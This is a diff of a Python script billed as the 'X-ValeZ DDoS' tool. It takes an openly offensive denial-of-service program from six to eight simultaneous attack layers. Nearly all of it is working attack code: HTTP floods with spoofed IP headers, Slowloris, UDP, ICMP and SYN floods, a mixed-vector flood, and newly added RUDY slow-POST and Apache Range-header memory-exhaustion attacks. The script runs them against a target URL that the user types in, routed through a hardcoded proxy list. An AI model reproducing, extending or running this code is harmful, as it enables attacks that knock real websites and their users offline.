@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
-# X-ValeZ DDoS Termux Edition v5.0 - 6 Layer Brutal Mode
+# X-ValeZ DDoS Termux/Kali Edition v6.0 - 8 Layer Brutal Mode
 # By HexZ Team | AmbaRusV2 Edition
-# "Fuck yeah, Termux edition - No root, All brutal!"
+# "Fuck yeah, Termux/Kali - No root, 8 layers of pure pain!"
 
 import os
 import sys
@@ -27,7 +27,6 @@ try:
     from colorama import Fore, Style, init
     init(autoreset=True)
 except ImportError:
-    # Fallback jika colorama tidak terinstall
     class Fore:
         RED = '\033[91m'
         GREEN = '\033[92m'
@@ -41,9 +40,9 @@ except ImportError:
         RESET_ALL = '\033[0m'
 
 # ==================== CONFIG ====================
-VERSION = "5.0"
+VERSION = "6.0"
 MAX_THREADS = 5000
-DEFAULT_THREADS = 1500
+DEFAULT_THREADS = 2000
 DEFAULT_DURATION = 180
 DEFAULT_PACKET_SIZE = 2048
 
@@ -83,7 +82,7 @@ def show_banner():
 ║                ║        By HexZ Team           ║                    ║
 ║                ╚═══════════════════════════════╝                    ║
 ║                                                                      ║
-║      "{Fore.YELLOW}Fuck yeah, Termux edition - No root, All brutal!{Fore.RED}"       ║
+║      "{Fore.YELLOW}Fuck yeah! 8 layers - No root, All brutal!{Fore.RED}"        ║
 ║                                                                      ║
 ╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
 """
@@ -93,26 +92,19 @@ def show_banner():
 class DomainResolver:
     @staticmethod
     def resolve(target_url):
-        """Resolve domain to IP address - Termux friendly"""
         parsed = urlparse(target_url)
         host = parsed.netloc.split(":")[0]
         port = parsed.port or (443 if parsed.scheme == "https" else 80)
-        
         try:
             ip = socket.gethostbyname(host)
             return ip, port, host
         except:
             try:
-                # Fallback dengan DNS query manual
                 import dns.resolver
                 answers = dns.resolver.resolve(host, 'A')
                 ip = str(answers[0])
                 return ip, port, host
-            except ImportError:
-                print(f"{Fore.YELLOW}[!] dnspython not installed, using hostname directly{Style.RESET_ALL}")
-                return host, port, host
             except:
-                print(f"{Fore.RED}[!] Failed to resolve domain. Using hostname directly.{Style.RESET_ALL}")
                 return host, port, host
 
 # ==================== PROXY MANAGER ====================
@@ -121,10 +113,7 @@ class ProxyManager:
         self.proxies = []
         self.lock = threading.Lock()
         self.load_proxies()
-    
     def load_proxies(self):
-        """Load proxies - Termux friendly"""
-        # Real public proxies
         real_proxies = [
             "190.61.38.18:8080", "200.105.146.186:999", "45.235.191.120:8080",
             "190.97.196.79:999", "200.75.136.194:999", "190.61.46.244:8080",
@@ -138,21 +127,17 @@ class ProxyManager:
         ]
         self.proxies = [f"http://{p}" for p in real_proxies]
         self.proxies.extend([f"socks5://{p}" for p in real_proxies])
-        
-        # Generate random proxies for volume
         for _ in range(1000):
             ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
             port = random.randint(1000, 9999)
             self.proxies.append(f"http://{ip}:{port}")
             self.proxies.append(f"socks5://{ip}:{port}")
-    
     def get_random_proxy(self):
         with self.lock:
             return random.choice(self.proxies) if self.proxies else None
 
 # ==================== LAYER 1: HTTP/2 FLOOD ====================
 class HttpFlood:
-    """Layer 1: HTTP/2 protocol flood"""
     def __init__(self, target, ip, port, threads, duration, packet_size):
         self.target = target
         self.ip = ip
@@ -168,12 +153,9 @@ class HttpFlood:
         self.host = self.parsed.netloc.split(":")[0]
         self.path = self.parsed.path or "/"
         self.is_https = self.parsed.scheme == "https"
-    
     def _generate_payload(self):
-        """Generate HTTP payload with random methods and headers"""
         methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE"]
         method = random.choice(methods)
-        
         headers = f"{method} {self.path} HTTP/1.1\r\n"
         headers += f"Host: {self.host}\r\n"
         headers += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
@@ -184,17 +166,12 @@ class HttpFlood:
         headers += f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
         headers += f"Pragma: no-cache\r\n"
         headers += f"Referer: {random.choice(REFERERS)}\r\n"
-        
-        # Spoofed IP headers
         spoofed_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
         headers += f"X-Forwarded-For: {spoofed_ip}\r\n"
         headers += f"X-Real-IP: {spoofed_ip}\r\n"
         headers += f"Client-IP: {spoofed_ip}\r\n"
-        
-        # Random extra headers
         for _ in range(random.randint(1, 3)):
             headers += f"X-{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}: {hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}\r\n"
-        
         if method in ["POST", "PUT", "PATCH"]:
             body_length = random.randint(1024, self.packet_size * 2)
             body = hashlib.md5(os.urandom(body_length)).hexdigest() * (body_length // 32 + 1)
@@ -204,46 +181,32 @@ class HttpFlood:
             return headers + "\r\n" + body
         else:
             return headers + "\r\n"
-    
     def _attack_worker(self):
-        """Single worker for HTTP flooding"""
         while self.running:
             try:
-                proxy = self.proxy_manager.get_random_proxy()
-                proxies = {"http": proxy, "https": proxy} if proxy else None
-                
                 payload = self._generate_payload()
                 method = payload.split(" ")[0]
-                
-                # Raw socket for speed
                 if self.is_https:
                     conn = http.client.HTTPSConnection(self.host, timeout=3, context=ssl._create_unverified_context())
                 else:
                     conn = http.client.HTTPConnection(self.host, timeout=3)
-                
                 body = None
                 if method in ["POST", "PUT", "PATCH"]:
                     parts = payload.split("\r\n\r\n")
                     if len(parts) > 1:
                         body = parts[1]
-                
                 conn.request(method, self.path, body=body)
                 response = conn.getresponse()
-                
                 with self.lock:
                     self.stats["requests"] += 1
                     self.stats["bytes"] += len(payload)
-                
                 conn.close()
                 time.sleep(random.uniform(0.0001, 0.001))
-                
             except:
                 with self.lock:
                     self.stats["errors"] += 1
                 continue
-    
     def start(self):
-        """Start HTTP flood"""
         print(f"{Fore.GREEN}[✓] Layer 1: HTTP/2 Flood started with {self.threads} threads{Style.RESET_ALL}")
         threads = []
         for _ in range(self.threads):
@@ -251,18 +214,15 @@ class HttpFlood:
             t.daemon = True
             t.start()
             threads.append(t)
-        
         start_time = time.time()
         while self.running and (time.time() - start_time) < self.duration:
             time.sleep(2)
             with self.lock:
                 print(f"{Fore.CYAN}[Layer 1] Req: {self.stats['requests']} | Bytes: {self.stats['bytes']/1024/1024:.2f}MB | Errors: {self.stats['errors']}{Style.RESET_ALL}")
-        
         self.running = False
 
 # ==================== LAYER 2: SLOWLORIS ====================
 class Slowloris:
-    """Layer 2: Slowloris - keep connections open"""
     def __init__(self, target, ip, port, threads, duration):
         self.target = target
         self.ip = ip
@@ -276,37 +236,29 @@ class Slowloris:
         self.host = self.parsed.netloc.split(":")[0]
         self.path = self.parsed.path or "/"
         self.is_https = self.parsed.scheme == "https"
-    
     def _create_socket(self):
-        """Create and initialize a socket"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(10)
             sock.connect((self.ip, self.port))
-            
             if self.is_https:
                 try:
                     import ssl
                     sock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLS)
                 except:
                     pass
-            
             request = f"GET {self.path} HTTP/1.1\r\n"
             request += f"Host: {self.host}\r\n"
             request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
             request += "Accept: */*\r\n"
             request += "Accept-Encoding: gzip, deflate\r\n"
-            
             sock.send(request.encode())
-            
             with self.lock:
                 self.sockets.append(sock)
             return True
         except:
             return False
-    
     def _keep_alive(self):
-        """Keep sockets alive"""
         while self.running:
             with self.lock:
                 for sock in self.sockets[:]:
@@ -319,37 +271,29 @@ class Slowloris:
                         except:
                             pass
             time.sleep(random.uniform(5, 15))
-    
     def _worker(self):
-        """Worker to create new connections"""
         while self.running:
             target_count = self.threads * 3
             if len(self.sockets) < target_count:
                 for _ in range(min(10, target_count - len(self.sockets))):
                     self._create_socket()
             time.sleep(random.uniform(0.05, 0.1))
-    
     def start(self):
-        """Start Slowloris"""
         print(f"{Fore.GREEN}[✓] Layer 2: Slowloris started with {self.threads} sockets{Style.RESET_ALL}")
-        
         workers = []
         for _ in range(self.threads // 20 + 1):
             t = threading.Thread(target=self._worker)
             t.daemon = True
             t.start()
             workers.append(t)
-        
         keep_alive_t = threading.Thread(target=self._keep_alive)
         keep_alive_t.daemon = True
         keep_alive_t.start()
-        
         start_time = time.time()
         while self.running and (time.time() - start_time) < self.duration:
             time.sleep(3)
             with self.lock:
                 print(f"{Fore.CYAN}[Layer 2] Active sockets: {len(self.sockets)}{Style.RESET_ALL}")
-        
         self.running = False
         with self.lock:
             for sock in self.sockets:
@@ -360,7 +304,6 @@ class Slowloris:
 
 # ==================== LAYER 3: UDP AMPLIFICATION ====================
 class UDPFlood:
-    """Layer 3: UDP amplification flood"""
     def __init__(self, target, ip, port, threads, duration, packet_size):
         self.target = target
         self.ip = ip
@@ -371,9 +314,7 @@ class UDPFlood:
         self.running = True
         self.stats = {"packets": 0, "bytes": 0}
         self.lock = threading.Lock()
-    
     def _generate_payload(self):
-        """Generate random UDP payload"""
         payload_types = [
             os.urandom(self.packet_size),
             b'\x00' * self.packet_size,
@@ -381,48 +322,37 @@ class UDPFlood:
             hashlib.md5(os.urandom(64)).digest() * (self.packet_size // 16 + 1)
         ]
         return random.choice(payload_types)[:self.packet_size]
-    
     def _worker(self):
-        """UDP flood worker"""
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        
         while self.running:
             try:
                 payload = self._generate_payload()
                 target_port = random.choice([80, 53, 123, 161, 443, 8080, 8443, 5000])
                 sock.sendto(payload, (self.ip, target_port))
-                
                 with self.lock:
                     self.stats["packets"] += 1
                     self.stats["bytes"] += len(payload)
-                
                 time.sleep(random.uniform(0.00001, 0.0001))
             except:
                 continue
-    
     def start(self):
-        """Start UDP flood"""
         print(f"{Fore.GREEN}[✓] Layer 3: UDP Amplification started with {self.threads} threads{Style.RESET_ALL}")
-        
         threads = []
         for _ in range(self.threads):
             t = threading.Thread(target=self._worker)
             t.daemon = True
             t.start()
             threads.append(t)
-        
         start_time = time.time()
         while self.running and (time.time() - start_time) < self.duration:
             time.sleep(2)
             with self.lock:
                 print(f"{Fore.CYAN}[Layer 3] Packets: {self.stats['packets']} | Bytes: {self.stats['bytes']/1024/1024:.2f}MB{Style.RESET_ALL}")
-        
         self.running = False
 
 # ==================== LAYER 4: ICMP FRAGMENT ====================
 class ICMPFlood:
-    """Layer 4: ICMP fragment flood - No root friendly (try raw, fallback to ping)"""
     def __init__(self, target, ip, threads, duration, packet_size):
         self.target = target
         self.ip = ip
@@ -433,21 +363,17 @@ class ICMPFlood:
         self.stats = {"packets": 0, "bytes": 0}
         self.lock = threading.Lock()
         self.use_ping = False
-    
     def _create_icmp_packet(self):
-        """Create ICMP packet"""
         type_code = 8
         code = 0
         checksum = 0
         identifier = random.randint(1, 65535)
         sequence = random.randint(1, 65535)
-        
         payload = os.urandom(self.packet_size)
         packet = struct.pack("!BBHHH", type_code, code, checksum, identifier, sequence) + payload
         checksum = self._checksum(packet)
         packet = struct.pack("!BBHHH", type_code, code, checksum, identifier, sequence) + payload
         return packet
-    
     def _checksum(self, data):
         if len(data) % 2 != 0:
             data += b'\x00'
@@ -455,13 +381,10 @@ class ICMPFlood:
         s = (s >> 16) + (s & 0xffff)
         s += (s >> 16)
         return ~s & 0xffff
-    
     def _worker_raw(self):
-        """Worker with raw socket (requires root)"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            
             while self.running:
                 try:
                     packet = self._create_icmp_packet()
@@ -478,13 +401,10 @@ class ICMPFlood:
             self._worker_ping()
         except:
             pass
-    
     def _worker_ping(self):
-        """Fallback: ping flood using subprocess"""
         import subprocess
         while self.running:
             try:
-                # Termux ping command
                 cmd = f"ping -c 1 -s {self.packet_size} {self.ip} > /dev/null 2>&1"
                 subprocess.run(cmd, shell=True, timeout=2)
                 with self.lock:
@@ -493,29 +413,23 @@ class ICMPFlood:
                 time.sleep(random.uniform(0.001, 0.01))
             except:
                 continue
-    
     def start(self):
-        """Start ICMP flood"""
         print(f"{Fore.GREEN}[✓] Layer 4: ICMP Fragment Flood started{Style.RESET_ALL}")
-        
         threads = []
         for _ in range(min(self.threads, 50)):
             t = threading.Thread(target=self._worker_raw)
             t.daemon = True
             t.start()
             threads.append(t)
-        
         start_time = time.time()
         while self.running and (time.time() - start_time) < self.duration:
             time.sleep(2)
             with self.lock:
                 print(f"{Fore.CYAN}[Layer 4] Packets: {self.stats['packets']} | Bytes: {self.stats['bytes']/1024/1024:.2f}MB{Style.RESET_ALL}")
-        
         self.running = False
 
 # ==================== LAYER 5: SYN SPOOF ====================
 class SYNFlood:
-    """Layer 5: SYN flood with spoofed IPs - No root friendly"""
     def __init__(self, target, ip, port, threads, duration):
         self.target = target
         self.ip = ip
@@ -525,18 +439,13 @@ class SYNFlood:
         self.running = True
         self.stats = {"packets": 0}
         self.lock = threading.Lock()
-    
     def _worker_raw(self):
-        """SYN flood with raw socket"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            
             while self.running:
                 try:
-                    # Send SYN packet manually
                     src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-                    # Simple SYN packet
                     packet = b'SYN' * 100
                     sock.sendto(packet, (self.ip, self.port))
                     with self.lock:
@@ -549,9 +458,7 @@ class SYNFlood:
             self._worker_tcp()
         except:
             pass
-    
     def _worker_tcp(self):
-        """Fallback: TCP connect flood"""
         while self.running:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -563,29 +470,23 @@ class SYNFlood:
                 time.sleep(random.uniform(0.001, 0.01))
             except:
                 continue
-    
     def start(self):
-        """Start SYN flood"""
         print(f"{Fore.GREEN}[✓] Layer 5: SYN/TCP Flood started with {self.threads} threads{Style.RESET_ALL}")
-        
         threads = []
         for _ in range(min(self.threads, 100)):
             t = threading.Thread(target=self._worker_raw)
             t.daemon = True
             t.start()
             threads.append(t)
-        
         start_time = time.time()
         while self.running and (time.time() - start_time) < self.duration:
             time.sleep(2)
             with self.lock:
                 print(f"{Fore.CYAN}[Layer 5] SYN packets: {self.stats['packets']}{Style.RESET_ALL}")
-        
         self.running = False
 
 # ==================== LAYER 6: MULTI-VECTOR ====================
 class MultiVector:
-    """Layer 6: Combined multi-vector attack"""
     def __init__(self, target, ip, port, threads, duration, packet_size):
         self.target = target
         self.ip = ip
@@ -599,15 +500,11 @@ class MultiVector:
         self.parsed = urlparse(target)
         self.host = self.parsed.netloc.split(":")[0]
         self.path = self.parsed.path or "/"
-    
     def _multi_vector_worker(self):
-        """Multi-vector combined attack"""
         while self.running:
             try:
                 attack_type = random.randint(1, 5)
-                
                 if attack_type == 1:
-                    # HTTP GET with random params
                     params = f"?{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}={random.randint(1,999999)}"
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.settimeout(2)
@@ -615,23 +512,17 @@ class MultiVector:
                     req = f"GET {self.path}{params} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n"
                     sock.send(req.encode())
                     sock.close()
-                    
                 elif attack_type == 2:
-                    # UDP flood
                     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                     target_port = random.choice([80, 443, 53, 123, 161, 8080])
                     sock.sendto(os.urandom(self.packet_size), (self.ip, target_port))
                     sock.close()
-                    
                 elif attack_type == 3:
-                    # TCP connect
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.settimeout(1)
                     sock.connect((self.ip, self.port))
                     sock.close()
-                    
                 elif attack_type == 4:
-                    # HTTP POST
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.settimeout(2)
                     sock.connect((self.ip, self.port))
@@ -639,40 +530,146 @@ class MultiVector:
                     req = f"POST {self.path} HTTP/1.1\r\nHost: {self.host}\r\nContent-Length: {len(body)}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n".encode() + body
                     sock.send(req)
                     sock.close()
-                    
                 else:
-                    # DNS query
                     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                     dns_query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01'
                     sock.sendto(dns_query, (self.ip, 53))
                     sock.close()
-                
                 with self.lock:
                     self.stats["packets"] += 1
                     self.stats["bytes"] += self.packet_size
-                
                 time.sleep(random.uniform(0.00001, 0.001))
-                
             except:
                 continue
-    
     def start(self):
-        """Start Multi-Vector attack"""
         print(f"{Fore.GREEN}[✓] Layer 6: Multi-Vector Combined started with {self.threads} threads{Style.RESET_ALL}")
-        
         threads = []
         for _ in range(self.threads):
             t = threading.Thread(target=self._multi_vector_worker)
             t.daemon = True
             t.start()
             threads.append(t)
-        
         start_time = time.time()
         while self.running and (time.time() - start_time) < self.duration:
             time.sleep(2)
             with self.lock:
                 print(f"{Fore.CYAN}[Layer 6] Packets: {self.stats['packets']} | Bytes: {self.stats['bytes']/1024/1024:.2f}MB{Style.RESET_ALL}")
-        
+        self.running = False
+
+# ==================== LAYER 7: RUDY ATTACK (SLOW POST) ====================
+class RUDYAttack:
+    """Layer 7: RUDY - Slow POST attack (ties up server threads)"""
+    def __init__(self, target, ip, port, threads, duration):
+        self.target = target
+        self.ip = ip
+        self.port = port
+        self.threads = threads
+        self.duration = duration
+        self.running = True
+        self.stats = {"connections": 0, "bytes": 0}
+        self.lock = threading.Lock()
+        self.parsed = urlparse(target)
+        self.host = self.parsed.netloc.split(":")[0]
+        self.path = self.parsed.path or "/"
+    def _rudy_worker(self):
+        while self.running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(30)
+                sock.connect((self.ip, self.port))
+                content_length = random.randint(1000000, 10000000)
+                headers = f"POST {self.path} HTTP/1.1\r\n"
+                headers += f"Host: {self.host}\r\n"
+                headers += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                headers += f"Content-Type: application/x-www-form-urlencoded\r\n"
+                headers += f"Content-Length: {content_length}\r\n"
+                headers += "\r\n"
+                sock.send(headers.encode())
+                with self.lock:
+                    self.stats["connections"] += 1
+                chunk_size = 10
+                sent = 0
+                while self.running and sent < content_length:
+                    chunk = hashlib.md5(str(random.random()).encode()).hexdigest()[:chunk_size].encode()
+                    sock.send(chunk)
+                    sent += len(chunk)
+                    with self.lock:
+                        self.stats["bytes"] += len(chunk)
+                    time.sleep(random.uniform(1, 5))  # Slow
+                sock.close()
+            except:
+                continue
+    def start(self):
+        print(f"{Fore.GREEN}[✓] Layer 7: RUDY Slow POST started with {self.threads} threads{Style.RESET_ALL}")
+        threads = []
+        for _ in range(self.threads):
+            t = threading.Thread(target=self._rudy_worker)
+            t.daemon = True
+            t.start()
+            threads.append(t)
+        start_time = time.time()
+        while self.running and (time.time() - start_time) < self.duration:
+            time.sleep(3)
+            with self.lock:
+                print(f"{Fore.CYAN}[Layer 7] Connections: {self.stats['connections']} | Bytes: {self.stats['bytes']/1024/1024:.2f}MB{Style.RESET_ALL}")
+        self.running = False
+
+# ==================== LAYER 8: APACHE KILLER (RANGE HEADER) ====================
+class ApacheKiller:
+    """Layer 8: Apache Killer - Range header attack (causes memory exhaustion)"""
+    def __init__(self, target, ip, port, threads, duration):
+        self.target = target
+        self.ip = ip
+        self.port = port
+        self.threads = threads
+        self.duration = duration
+        self.running = True
+        self.stats = {"requests": 0}
+        self.lock = threading.Lock()
+        self.parsed = urlparse(target)
+        self.host = self.parsed.netloc.split(":")[0]
+        self.path = self.parsed.path or "/"
+    def _apache_killer_worker(self):
+        while self.running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5)
+                sock.connect((self.ip, self.port))
+                ranges = ",".join([f"{i}-{i+100}" for i in range(0, 5000, 200)])
+                headers = f"GET {self.path} HTTP/1.1\r\n"
+                headers += f"Host: {self.host}\r\n"
+                headers += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                headers += f"Range: bytes={ranges}\r\n"
+                headers += "Accept-Encoding: identity\r\n"
+                headers += "Connection: close\r\n"
+                headers += "\r\n"
+                sock.send(headers.encode())
+                sock.settimeout(30)
+                try:
+                    while True:
+                        data = sock.recv(1024)
+                        if not data:
+                            break
+                except:
+                    pass
+                sock.close()
+                with self.lock:
+                    self.stats["requests"] += 1
+            except:
+                continue
+    def start(self):
+        print(f"{Fore.GREEN}[✓] Layer 8: Apache Killer started with {self.threads} threads{Style.RESET_ALL}")
+        threads = []
+        for _ in range(self.threads):
+            t = threading.Thread(target=self._apache_killer_worker)
+            t.daemon = True
+            t.start()
+            threads.append(t)
+        start_time = time.time()
+        while self.running and (time.time() - start_time) < self.duration:
+            time.sleep(2)
+            with self.lock:
+                print(f"{Fore.CYAN}[Layer 8] Requests: {self.stats['requests']}{Style.RESET_ALL}")
         self.running = False
 
 # ==================== MAIN CONTROLLER ====================
@@ -685,34 +682,24 @@ class XValeZController:
         self.threads = DEFAULT_THREADS
         self.duration = DEFAULT_DURATION
         self.packet_size = DEFAULT_PACKET_SIZE
-    
     def get_user_input(self):
-        """Get target and parameters"""
         print(f"{Fore.YELLOW}")
         self.target = input("Enter target URL (http:// or https://): ").strip()
         if not self.target.startswith(("http://", "https://")):
             self.target = "http://" + self.target
-        
-        # Resolve domain
         self.ip, self.port, self.host = DomainResolver.resolve(self.target)
         if not self.ip:
             self.ip = self.host
-        
         print(f"{Fore.GREEN}[+] Resolved IP: {self.ip}{Style.RESET_ALL}")
-        
-        threads_input = input("Enter thread count (default 1500): ").strip()
+        threads_input = input("Enter thread count (default 2000): ").strip()
         self.threads = int(threads_input) if threads_input.isdigit() else DEFAULT_THREADS
         self.threads = min(self.threads, MAX_THREADS)
-        
         duration_input = input("Enter attack duration in seconds (default 180): ").strip()
         self.duration = int(duration_input) if duration_input.isdigit() else DEFAULT_DURATION
-        
         packet_input = input("Enter packet size in bytes (default 2048): ").strip()
         self.packet_size = int(packet_input) if packet_input.isdigit() else DEFAULT_PACKET_SIZE
         print(f"{Style.RESET_ALL}")
-    
     def show_config(self):
-        """Show attack configuration"""
         print(f"{Fore.GREEN}")
         print(f"[+] Target: {self.target}")
         print(f"[+] Resolved IP: {self.ip}")
@@ -720,76 +707,43 @@ class XValeZController:
         print(f"[+] Duration: {self.duration} seconds")
         print(f"[+] Packet size: {self.packet_size} bytes")
         print(f"{Style.RESET_ALL}")
-    
     def start_attack(self):
-        """Start all 6 attack layers"""
         print(f"{Fore.RED}")
         print("[==================================================]")
-        print("[  X-ValeZ TERMUX - 6 LAYER BRUTAL MODE ACTIVE ]")
+        print("[  X-ValeZ - 8 LAYER BRUTAL MODE ACTIVE ]")
         print("[==================================================]")
         print(f"{Style.RESET_ALL}")
-        
-        # Calculate threads per layer
-        layer_threads = max(1, self.threads // 6)
-        
-        # Layer 1: HTTP Flood
+        layer_threads = max(1, self.threads // 8)
+        # Layer 1
         http_flood = HttpFlood(self.target, self.ip, self.port, layer_threads, self.duration, self.packet_size)
-        
-        # Layer 2: Slowloris
+        # Layer 2
         slowloris = Slowloris(self.target, self.ip, self.port, layer_threads, self.duration)
-        
-        # Layer 3: UDP Flood
+        # Layer 3
         udp_flood = UDPFlood(self.target, self.ip, self.port, layer_threads, self.duration, self.packet_size)
-        
-        # Layer 4: ICMP Flood
+        # Layer 4
         icmp_flood = ICMPFlood(self.target, self.ip, layer_threads // 2, self.duration, self.packet_size)
-        
-        # Layer 5: SYN Flood
+        # Layer 5
         syn_flood = SYNFlood(self.target, self.ip, self.port, layer_threads // 2, self.duration)
-        
-        # Layer 6: Multi-Vector
+        # Layer 6
         multi_vector = MultiVector(self.target, self.ip, self.port, layer_threads, self.duration, self.packet_size)
-        
-        # Start all layers
+        # Layer 7
+        rudy = RUDYAttack(self.target, self.ip, self.port, layer_threads // 2, self.duration)
+        # Layer 8
+        apache = ApacheKiller(self.target, self.ip, self.port, layer_threads // 2, self.duration)
         attack_threads = []
-        
-        t1 = threading.Thread(target=http_flood.start)
-        t1.daemon = True
-        t1.start()
-        attack_threads.append(t1)
-        
-        t2 = threading.Thread(target=slowloris.start)
-        t2.daemon = True
-        t2.start()
-        attack_threads.append(t2)
-        
-        t3 = threading.Thread(target=udp_flood.start)
-        t3.daemon = True
-        t3.start()
-        attack_threads.append(t3)
-        
-        t4 = threading.Thread(target=icmp_flood.start)
-        t4.daemon = True
-        t4.start()
-        attack_threads.append(t4)
-        
-        t5 = threading.Thread(target=syn_flood.start)
-        t5.daemon = True
-        t5.start()
-        attack_threads.append(t5)
-        
-        t6 = threading.Thread(target=multi_vector.start)
-        t6.daemon = True
-        t6.start()
-        attack_threads.append(t6)
-        
-        # Monitor
+        t1 = threading.Thread(target=http_flood.start); t1.daemon=True; t1.start(); attack_threads.append(t1)
+        t2 = threading.Thread(target=slowloris.start); t2.daemon=True; t2.start(); attack_threads.append(t2)
+        t3 = threading.Thread(target=udp_flood.start); t3.daemon=True; t3.start(); attack_threads.append(t3)
+        t4 = threading.Thread(target=icmp_flood.start); t4.daemon=True; t4.start(); attack_threads.append(t4)
+        t5 = threading.Thread(target=syn_flood.start); t5.daemon=True; t5.start(); attack_threads.append(t5)
+        t6 = threading.Thread(target=multi_vector.start); t6.daemon=True; t6.start(); attack_threads.append(t6)
+        t7 = threading.Thread(target=rudy.start); t7.daemon=True; t7.start(); attack_threads.append(t7)
+        t8 = threading.Thread(target=apache.start); t8.daemon=True; t8.start(); attack_threads.append(t8)
         start_time = time.time()
         while time.time() - start_time < self.duration:
             time.sleep(5)
             remaining = int(self.duration - (time.time() - start_time))
-            print(f"{Fore.YELLOW}[Live] Time remaining: {remaining}s | 6 layers active{Style.RESET_ALL}")
-        
+            print(f"{Fore.YELLOW}[Live] Time remaining: {remaining}s | 8 layers active{Style.RESET_ALL}")
         print(f"{Fore.RED}")
         print("[==================================================]")
         print("[  ATTACK COMPLETED - MISSION ACCOMPLISHED ]")
